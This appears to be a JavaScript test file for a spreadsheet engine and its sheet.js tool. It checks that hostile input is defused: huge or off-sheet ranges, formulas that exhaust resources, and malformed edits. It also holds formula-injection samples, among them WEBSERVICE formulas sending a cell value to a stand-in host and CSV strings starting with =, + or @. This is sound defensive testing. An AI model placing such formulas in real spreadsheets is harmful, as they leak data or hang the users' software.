// Hostile input: what a saved page, a pushed batch, another person's edit or a typed cell can hold, and what
// the downloads and sheet.js do with it. Loaded by tests/run.js.
"use strict";
const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { spawnSync } = require("child_process");

module.exports = function ({ E, test, script, within, ROOT }) {
  const SHEET_JS = path.join(ROOT, "sheets/assets/sheet.js");
  const errOf = (v) => (v && v.e) || null;

  // --- one check for every address and range, and a budget for the work a formula can make ---
  test("a range at row 2^53 is #REF! at once, not a hang (a saved page, a batch, a typed cell)", () => {
    const f = "=SUM(A9007199254740992:A9007199254740992)";
    const v = within(2000, () => new E.Book({ tabs: [{ name: "T", cells: { A1: f } }] }).value("T", "A1"));
    assert.strictEqual(errOf(v), "#REF!");
    const d = { tabs: [{ name: "T", cells: {} }] };
    assert.strictEqual(E.applyDelta(d, JSON.stringify({ tab: "T", cells: { A1: f } })).ok, true); // a formula is data
    assert.strictEqual(errOf(within(2000, () => new E.Book(d).value("T", "A1"))), "#REF!");
    const typed = within(2000, () => new E.Book(d, { t: { B2: { v: f, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } }).value("T", "B2"));
    assert.strictEqual(errOf(typed), "#REF!");
  });
  test("a batch with a cell off the sheet is refused whole", () => {
    for (const a of ["ZZZ9999999", "A10001", "ALM1", "A9007199254740992"]) {
      const d = { tabs: [{ name: "T", cells: {} }] }, r = E.applyDelta(d, JSON.stringify({ tab: "T", cells: { A1: 1, [a]: 1 } }));
      assert.strictEqual(r.ok, false, a);
      assert.match(r.why, /isn't a cell on the sheet/);
      assert.deepStrictEqual(JSON.parse(JSON.stringify(d.tabs[0].cells)), {});
    }
  });
  test("a cell off the sheet, from a saved page or a person's edit, isn't kept, and the grid drawn stays bounded", () => {
    const b = within(2000, () => new E.Book({ tabs: [{ name: "T", cells: { A1: "x", ZZZ9999999: "far" } }] },
      { t: { ZZZ9999999: { v: 1, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } }));
    assert.deepStrictEqual(Object.keys(b.raw.t), ["A1"]);
    assert.deepStrictEqual(JSON.parse(JSON.stringify(E.drawSize(b, b.tabs.t))), { rows: 12, cols: 4, cut: 0 });
    // The far corner a person may still reach: drawn only up to the cap on cells, and the page says so.
    const corner = E.colName(E.LIMIT.cols) + E.LIMIT.rows;
    const c = new E.Book({ tabs: [{ name: "T", cells: { A1: "x" } }] }, { t: { [corner]: { v: 1, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } });
    const ds = E.drawSize(c, c.tabs.t);
    assert.ok(ds.rows * ds.cols <= E.LIMIT.cells, JSON.stringify(ds));
    assert.ok(ds.cut > 0);
    const ui = script("sheet-ui");
    assert.match(ui, /E\.drawSize\(book, tab\)/);
  });
  test("a formula that would read millions of cells ends in #CALC!, not a hang", () => {
    const cells = { A1: 1 };
    for (let r = 1; r <= 40; r++) cells["B" + r] = "=SUMPRODUCT((A1:T10000=1)*(A1:T10000=1))";
    const t0 = Date.now();
    const vals = within(20000, () => { const b = new E.Book({ tabs: [{ name: "T", cells }] }); return Object.keys(cells).map((a) => b.value("T", a)); });
    assert.ok(vals.some((v) => errOf(v) === "#CALC!"), "no cell ran out of budget");
    assert.ok(Date.now() - t0 < 6000, `took ${Date.now() - t0} ms`);
    assert.strictEqual(vals[0], 1);
  });
  test("text past Excel's 32,767 characters is #VALUE!, so cells doubling each other end", () => {
    const cells = { A1: "xx" };
    for (let r = 2; r <= 24; r++) cells["A" + r] = `=A${r - 1}&A${r - 1}`;
    const b = new E.Book({ tabs: [{ name: "T", cells }] });
    const last = within(5000, () => b.value("T", "A24"));
    assert.strictEqual(errOf(last), "#VALUE!");
    assert.strictEqual(b.value("T", "A14").length, 16384);
    assert.strictEqual(errOf(within(2000, () => new E.Book({ tabs: [{ name: "T", cells: Object.assign({}, cells, { B1: "=CONCAT(A14,A14,A14)" }) }] }).value("T", "B1"))), "#VALUE!");
  });

  // --- a person's record ---
  test("a malformed edit in a person's record is skipped; the good ones still count", () => {
    const edits = {
      "Budget!A1": null, "Budget!A2": "text", "Budget!A3": { v: { x: 1 }, at: "2026-11-14T10:00:00Z" }, "Budget!A4": { v: 1 },
      "Budget!A5": { v: 1, at: "not a time" }, "Budget!ZZZ9999999": { v: 1, at: "2026-11-14T10:00:00Z" }, "A6": { v: 1, at: "2026-11-14T10:00:00Z" },
      "Budget!a7": { v: 1, at: "2026-11-14T10:00:00Z" }, "Budget!B2": { v: 120, at: "2026-11-14T10:00:00Z" },
    };
    const ok = JSON.parse(JSON.stringify(E.cleanEdits(edits)));
    assert.deepStrictEqual(ok, [{ tab: "budget", a: "B2", v: 120, at: "2026-11-14T10:00:00Z", t: Date.parse("2026-11-14T10:00:00Z") }]);
    for (const bad of [null, "edits", [1, 2], 5]) assert.deepStrictEqual(JSON.parse(JSON.stringify(E.cleanEdits(bad))), []);
    const ui = script("sheet-ui");
    assert.match(ui, /E\.cleanEdits\(rec\.data && rec\.data\.edits\)/);
    // When loading fails, the sheet as saved is drawn: no one's records, so a bad one can't be drawn again.
    assert.match(ui, /\.catch\(function \(e\) \{[^}]*state\.others = \[\]; state\.me = null;/);
  });

  // --- downloads ---
  const unzipText = (bytes) => Buffer.from(bytes).toString("utf8"); // a stored zip: the parts are plain text
  function exportBook() {
    const data = { title: "T", currency: "GBP", locale: "en-GB", tabs: [{ name: "Budget", cells: {
      B1: 10, B2: 20, C1: "=SUM(B1:B2)", C2: "=WEBSERVICE(\"https://example.invalid/?value=\"&B1)", C3: "='http://x.invalid/[a.xlsx]S'!A1",
      C4: "=FILTERXML(B1,\"x\")", D1: "@SUM(1+1)", D2: "-5 apples", D3: -5, D4: "+44 20 7946 0000", D5: "=\"=1+1\"" } }] };
    const ov = { budget: {
      E1: { v: "=SUM(B1:B2)", at: "2026-11-14T10:00:00Z", by: "Sam", peer: true },
      E2: { v: "=WEBSERVICE(\"https://example.invalid/?v=\"&B1)", at: "2026-11-14T10:00:00Z", by: "Sam", peer: true },
      E3: { v: "=B1*2", at: "2026-11-14T10:00:00Z", by: "You" } } };
    return new E.Book(data, ov);
  }
  test(".xlsx: only the sheet's own formulas with the engine's functions go live; the rest is text Excel won't run", () => {
    const xml = unzipText(E.xlsx(exportBook()));
    const f = [...xml.matchAll(/<c r="([A-Z]+\d+)"[^>]*><f>([^<]*)<\/f>/g)].map((m) => m[1] + " " + m[2]);
    assert.deepStrictEqual(f.sort(), ["C1 SUM(B1:B2)", "D5 &quot;=1+1&quot;", "E3 B1*2"]);
    assert.ok(!/WEBSERVICE[^<]*<\/f>|FILTERXML[^<]*<\/f>|\[a\.xlsx\][^<]*<\/f>/.test(xml));
    for (const [a, text] of [["C2", '=WEBSERVICE("https://example.invalid/?value="&amp;B1)'], ["E1", "=SUM(B1:B2)"], ["C4", '=FILTERXML(B1,"x")']]) {
      const m = new RegExp(`<c r="${a}" s="(\\d+)" t="inlineStr"><is><t xml:space="preserve">([^<]*)</t>`).exec(xml);
      assert.ok(m, `${a} isn't text`);
      assert.strictEqual(m[2].replace(/&quot;/g, '"'), text);
      const xf = [...xml.matchAll(/<cellXfs[^>]*>([\s\S]*?)<\/cellXfs>/g)][0][1].match(/<xf [^>]*\/>/g)[+m[1]];
      assert.match(xf, /quotePrefix="1"/, `${a}'s style keeps it text when someone edits it in Excel`);
    }
    assert.match(xml, /<c r="D1" s="\d+" t="inlineStr"><is><t xml:space="preserve">@SUM\(1\+1\)<\/t>/);
  });
  test("CSV: text starting with = + - or @ gets a leading apostrophe; numbers don't", () => {
    const rows = E.csv(exportBook(), "Budget").trim().split("\r\n").map((l) => l.split(","));
    assert.strictEqual(rows[0][3], "'@SUM(1+1)");
    assert.strictEqual(rows[1][3], "'-5 apples");
    assert.strictEqual(rows[2][3], "-5");
    assert.strictEqual(rows[3][3], "'+44 20 7946 0000");
    assert.strictEqual(rows[4][3], "'=1+1");
    assert.strictEqual(rows[0][2], "30");
  });

  // --- sheet.js ---
  function folder(failOn) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sheets-test-")), bin = path.join(dir, "bin");
    fs.mkdirSync(bin); fs.mkdirSync(path.join(dir, "w", ".sheet"), { recursive: true });
    // A stand-in for the spacesheep CLI: it refuses the commands named in failOn, and answers the rest.
    fs.writeFileSync(path.join(bin, "spacesheep"), `#!/bin/sh\ncase " $* " in\n${failOn.map((w) => `  *" ${w} "*) echo "refused: $1" >&2; exit 1;;`).join("\n")}\nesac\ncat >/dev/null\necho '{"tabs_open":1}'\n`, { mode: 0o755 });
    fs.writeFileSync(path.join(dir, "w", ".sheet", "space"), "00000000-0000-4000-8000-000000000000");
    fs.writeFileSync(path.join(dir, "w", "data.json"), JSON.stringify({ title: "T", tabs: [{ name: "Budget", freeze: 1, cells: { A1: "Item" } }] }));
    const run = (...args) => spawnSync(process.execPath, [SHEET_JS, "-C", path.join(dir, "w"), ...args], { encoding: "utf8", env: Object.assign({}, process.env, { PATH: `${bin}:${process.env.PATH}` }) });
    return { dir, run, sent: () => fs.existsSync(path.join(dir, "w", ".sheet", "sent.json")) };
  }
  test("sheet.js: a page push and a save that both fail exit non-zero and mark nothing sent, so a retry sends it", () => {
    const f = folder(["call", "deploy"]);
    const r = f.run("push", "Writing Budget");
    assert.notStrictEqual(r.status, 0, r.stdout + r.stderr);
    assert.strictEqual(f.sent(), false);
    assert.doesNotMatch(f.run("push").stdout, /no cell changed/);
  });
  test("sheet.js: a save whose version lands but whose live push fails exits non-zero", () => {
    const f = folder(["call"]);
    const r = f.run("save", "The budget");
    assert.notStrictEqual(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /saved: The budget/);
    assert.strictEqual(f.sent(), false);
  });
  test("sheet.js refuses a cell off the sheet before sending anything", () => {
    const f = folder([]);
    fs.mkdirSync(path.join(f.dir, "w", "cells"));
    fs.writeFileSync(path.join(f.dir, "w", "cells", "01-x.json"), JSON.stringify({ tab: "Budget", cells: { "A2:A10002": "=1" } }));
    const r = f.run("push");
    assert.notStrictEqual(r.status, 0);
    assert.match(r.stderr, /Budget!A10001 isn't a cell on the sheet/);
    assert.strictEqual(f.sent(), false);
  });
  test("sheet.js refuses a drop-down, tick, highlight or chart range off the sheet, which the page would drop", () => {
    const f = folder([]), data = JSON.parse(fs.readFileSync(path.join(f.dir, "w", "data.json"), "utf8"));
    data.tabs[0].lists = [{ range: "B2:B20000", values: ["a", "b"] }];
    fs.writeFileSync(path.join(f.dir, "w", "data.json"), JSON.stringify(data));
    const r = f.run("push");
    assert.notStrictEqual(r.status, 0);
    assert.match(r.stderr, /Budget: the range B2:B20000 runs off the sheet/);
  });
};
